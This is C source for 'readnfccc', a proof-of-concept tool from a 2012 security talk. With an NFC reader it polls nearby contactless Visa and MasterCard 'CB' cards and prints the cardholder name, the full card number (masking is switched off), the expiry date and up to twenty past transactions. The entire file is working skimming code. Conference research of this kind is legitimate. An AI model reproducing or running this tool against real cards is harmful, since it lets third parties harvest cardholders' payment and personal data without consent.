/*

readnfccc - by Renaud Lifchitz (renaud.lifchitz@bt.com)
License: distributed under GPL version 3 (http://www.gnu.org/licenses/gpl.html)

* Introduction:
"Quick and dirty" proof-of-concept
Open source tool developped and showed for Hackito Ergo Sum 2012 - "Hacking the NFC credit cards for fun and debit ;)"
Reads NFC credit card personal data (gender, first name, last name, PAN, expiration date, transaction history...)

* Requirements:
libnfc (>= 1.6) and a suitable NFC reader (http://www.libnfc.org/documentation/hardware/compatibility)

* Compilation:
$ gcc readnfccc.c -lnfc -o readnfccc

* Known bugs and limitations:
- Supports only Visa & MasterCard "CB" credit cards (AID = A0 00 00 00 42 10 10)
- No support for currency and country in history (always shows € and doesn't display country)
- Needs code cleaning

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <nfc/nfc.h>

// Choose whether to mask the PAN or not
#define MASKED 0

#define MAX_FRAME_LEN 300

static void show(int recvlg, uint8_t *recv)
{
  int i;
  printf("< [%02d] ", recvlg);
  for(i = 0; i < (int) recvlg; i++)
  {
    printf("%02x ", (unsigned int) recv[i]);
  }
  printf("\n");
}

int main(int argc, char **argv)
{
  nfc_device* pnd;

  uint8_t abtRx[MAX_FRAME_LEN];
//   uint8_t abtTx[MAX_FRAME_LEN];
  int szRx = sizeof(abtRx);
//   size_t szTx;

  uint8_t START_14443A[] = {0x4A, 0x01, 0x00};
  uint8_t SELECT_APP[] = {0x40, 0x01, 0x00, 0xA4, 0x04, 0x00, 0x07, 0xA0, 0x00, 0x00, 0x00, 0x42, 0x10, 0x10, 0x00};
  uint8_t READ_RECORD_VISA[] = {0x40, 0x01, 0x00, 0xB2, 0x02, 0x0C, 0x00, 0x00};
  uint8_t READ_RECORD_MC[] = {0x40, 0x01, 0x00, 0xB2, 0x01, 0x14, 0x00, 0x00};
  uint8_t READ_PAYLOG_VISA[] = {0x40, 0x01, 0x00, 0xB2, 0x01, 0x8C, 0x00, 0x00};
  uint8_t READ_PAYLOG_MC[] = {0x40, 0x01, 0x00, 0xB2, 0x01, 0x5C, 0x00, 0x00};

  uint8_t *res;
  char output[50], c, amount[10], msg[100];
  unsigned int i, j, expiry;

  nfc_context *context;
  nfc_init(&context);
  if (context == NULL) {
    printf("Unable to init libnfc (malloc)");
    exit(EXIT_FAILURE);
  }

  pnd = nfc_open(context, NULL);
  if (pnd == NULL)
  {
    printf("Unable to connect to NFC device.\n");
    return(1);
  }
  printf("Connected to NFC reader: %s\n", nfc_device_get_name(pnd));
  // Initialise NFC device as "initiator"
  if (nfc_initiator_init(pnd) < 0) {
    nfc_perror(pnd, "nfc_initiator_init");
    nfc_close(pnd);
    nfc_exit(context);
    exit(EXIT_FAILURE);
  }

  while(1)
  {

    szRx = pn53x_transceive(pnd, START_14443A, sizeof(START_14443A), abtRx, sizeof(abtRx), NULL);
    if (szRx < 0)
    {
      nfc_perror(pnd, "START_14443A");
      return(1);
    }
    show(szRx, abtRx);

    szRx = pn53x_transceive(pnd, SELECT_APP, sizeof(SELECT_APP), abtRx, sizeof(abtRx), NULL);
    if (szRx < 0)
    {
      nfc_perror(pnd, "SELECT_APP");
      return(1);
    }
    show(szRx, abtRx);

    szRx = pn53x_transceive(pnd, READ_RECORD_VISA, sizeof(READ_RECORD_VISA), abtRx, sizeof(abtRx), NULL);
    if (szRx < 0)
    {
      nfc_perror(pnd, "READ_RECORD");
      return(1);
    }
    show(szRx, abtRx);

    /* Look for cardholder name */
    res = abtRx;
    for(i = 0; i < (unsigned int) szRx - 1; i++)
    {
      if(*res == 0x5f && *(res + 1) == 0x20)
      {
        strncpy(output, (char*)res + 3, (int) * (res + 2));
        output[(int) * (res + 2)] = 0;
        printf("Cardholder name: %s\n", output);
        break;
      }
      res++;
    }

    /* Look for PAN & Expiry date */
    res = abtRx;
    for(i = 0; i < (unsigned int) szRx - 1; i++)
    {
      if(*res == 0x4d && *(res + 1) == 0x57)
      {
        strncpy(output, (char*)res + 3, 13);
        output[11] = 0;
        printf("PAN:");

        for(j = 0; j < 8; j++)
        {
          if(j % 2 == 0) printf(" ");
          c = output[j];
          if(MASKED & (j >= 2) & (j <= 5))
          {
            printf("**");
          }
          else
          {
            printf("%02x", c & 0xff);
          }
        }
        printf("\n");
        expiry = (output[10] + (output[9] << 8) + (output[8] << 16)) >> 4;
        printf("Expiration date: %02x/20%02x\n\n", (expiry & 0xff), ((expiry >> 8) & 0xff));
        break;
      }
      res++;
    }

    szRx = pn53x_transceive(pnd, READ_RECORD_MC, sizeof(READ_RECORD_MC), abtRx, sizeof(abtRx), NULL);
    if (szRx < 0)
    {
      nfc_perror(pnd, "READ_RECORD");
      return(1);
    }
    //show(szRx, abtRx);

    /* Look for cardholder name */
    res = abtRx;
    for(i = 0; i < (unsigned int) szRx - 1; i++)
    {
      if(*res == 0x5f && *(res + 1) == 0x20)
      {
        strncpy(output, (char*)res + 3, (int) * (res + 2));
        output[(int) * (res + 2)] = 0;
        printf("Cardholder name: %s\n", output);
        break;
      }
      res++;
    }

    /* Look for PAN & Expiry date */
    res = abtRx;
    for(i = 0; i < (unsigned int) szRx - 1; i++)
    {
      if(*res == 0x9c && *(res + 1) == 0x57)
      {
        strncpy(output, (char*)res + 3, 13);
        output[11] = 0;
        printf("PAN:");

        for(j = 0; j < 8; j++)
        {
          if(j % 2 == 0) printf(" ");
          c = output[j];
          if(MASKED & (j >= 2) & (j <= 5))
          {
            printf("**");
          }
          else
          {
            printf("%02x", c & 0xff);
          }
        }
        printf("\n");
        expiry = (output[10] + (output[9] << 8) + (output[8] << 16)) >> 4;
        printf("Expiration date: %02x/20%02x\n\n", (expiry & 0xff), ((expiry >> 8) & 0xff));
        break;
      }
      res++;
    }


    for(i = 1; i <= 20; i++)
    {
      READ_PAYLOG_VISA[4] = i;
      szRx = pn53x_transceive(pnd, READ_PAYLOG_VISA, sizeof(READ_PAYLOG_VISA), abtRx, sizeof(abtRx), NULL);
      if (szRx < 0)
      {
        nfc_perror(pnd, "READ_RECORD");
        return(1);
      }
      if(szRx == 18) // Non-empty transaction
      {
        //show(szRx, abtRx);
        res = abtRx;

        /* Look for date */
        sprintf(msg, "%02x/%02x/20%02x", res[14], res[13], res[12]);

        /* Look for transaction type */
        if(res[15] == 0)
        {
          sprintf(msg, "%s %s", msg, "Payment");
        }
        else if(res[15] == 1)
        {
          sprintf(msg, "%s %s", msg, "Withdrawal");
        }

        /* Look for amount*/
        sprintf(amount, "%02x%02x%02x", res[3], res[4], res[5]);
        sprintf(msg, "%s\t%d,%02x€", msg, atoi(amount), res[6]);

        printf("%s\n", msg);
      }
    }

    for(i = 1; i <= 20; i++)
    {
      READ_PAYLOG_MC[4] = i;
      szRx = pn53x_transceive(pnd, READ_PAYLOG_MC, sizeof(READ_PAYLOG_MC), abtRx, sizeof(abtRx), NULL);
      if (szRx < 0)
      {
        nfc_perror(pnd, "READ_RECORD");
        return(1);
      }
      if(szRx == 18) // Non-empty transaction
      {
        //show(szRx, abtRx);
        res = abtRx;

        /* Look for date */
        sprintf(msg, "%02x/%02x/20%02x", res[14], res[13], res[12]);

        /* Look for transaction type */
        if(res[15] == 0)
        {
          sprintf(msg, "%s %s", msg, "Payment");
        }
        else if(res[15] == 1)
        {
          sprintf(msg, "%s %s", msg, "Withdrawal");
        }

        /* Look for amount*/
        sprintf(amount, "%02x%02x%02x", res[3], res[4], res[5]);
        sprintf(msg, "%s\t%d,%02x€", msg, atoi(amount), res[6]);

        printf("%s\n", msg);
      }
    }

    printf("-------------------------\n");
  }

  nfc_close(pnd);

  nfc_exit(context);

  return 0;
}

